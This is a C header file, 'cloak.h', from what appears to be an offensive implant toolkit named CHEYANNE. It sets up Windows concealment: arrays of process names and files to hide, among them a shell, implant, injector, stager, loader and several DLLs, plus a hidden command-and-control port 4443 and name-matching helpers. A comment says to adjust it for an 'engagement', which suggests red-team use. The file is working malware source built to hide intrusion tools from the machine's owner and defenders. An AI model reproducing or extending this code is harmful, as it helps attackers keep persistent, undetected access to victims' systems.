/*
 * cloak.h — CHEYANNE Concealment Configuration
 * 22DIV / george wu
 *
 * Defines what to hide: process names, filenames, C2 port.
 * Modify these arrays before compiling to match your engagement.
 */

#ifndef CLOAK_H
#define CLOAK_H

#include <windows.h>

static const wchar_t *HIDDEN_PROCESSES[] = {
    L"cheyanne_shell.exe",
    L"dark_room.exe",
    L"cheyanne_implant.exe",
    L"cheyanne_inject.exe",
    L"cheyanne_stager.exe",
    L"cloak_loader.exe",
    NULL
};

static const wchar_t *HIDDEN_FILES[] = {
    L"cheyanne_shell.exe",
    L"dark_room.exe",
    L"cheyanne_implant.exe",
    L"cheyanne_inject.exe",
    L"cheyanne_inject_dll.dll",
    L"cheyanne_stager.exe",
    L"osppc.dll",
    L"osppcext.dll",
    L"cloak.dll",
    L"cloak_loader.exe",
    L"cheyanne_implant_canary.txt",
    L"cheyanne_clean.exe",
    NULL
};

#define HIDDEN_C2_PORT 4443

static int wstricmp(const wchar_t *a, const wchar_t *b) {
    while (*a && *b) {
        wchar_t ca = (*a >= L'A' && *a <= L'Z') ? *a + 32 : *a;
        wchar_t cb = (*b >= L'A' && *b <= L'Z') ? *b + 32 : *b;
        if (ca != cb) return (int)(ca - cb);
        a++; b++;
    }
    return (int)(*a - *b);
}

static BOOL match_hidden_name(const wchar_t *name, ULONG nameLen, const wchar_t **list) {
    if (!name || nameLen == 0) return FALSE;
    for (int i = 0; list[i]; i++) {
        ULONG listLen = (ULONG)wcslen(list[i]);
        if (nameLen == listLen) {
            BOOL match = TRUE;
            for (ULONG j = 0; j < nameLen; j++) {
                wchar_t ca = (name[j] >= L'A' && name[j] <= L'Z') ? name[j] + 32 : name[j];
                wchar_t cb = (list[i][j] >= L'A' && list[i][j] <= L'Z') ? list[i][j] + 32 : list[i][j];
                if (ca != cb) { match = FALSE; break; }
            }
            if (match) return TRUE;
        }
    }
    return FALSE;
}

#endif
